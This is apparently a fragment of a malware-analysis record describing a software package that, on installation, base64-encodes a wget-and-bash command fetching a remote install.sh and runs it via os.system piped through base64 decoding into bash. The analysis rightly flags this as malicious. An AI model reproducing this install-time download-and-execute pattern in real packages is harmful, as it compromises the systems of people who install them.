After installing the package, it constructs a shell command that downloads and executes a remote shell script from https://down.threatest.com/uploads/install.sh using wget and bash. This command is base64-encoded and then executed via os.system('echo %s|base64 -d|bash' % encoded), which decodes and runs the script. This behavior is highly suspicious and characteristic of malicious code, as it executes arbitrary code from a remote server during package installation, potentially compromising the system.",
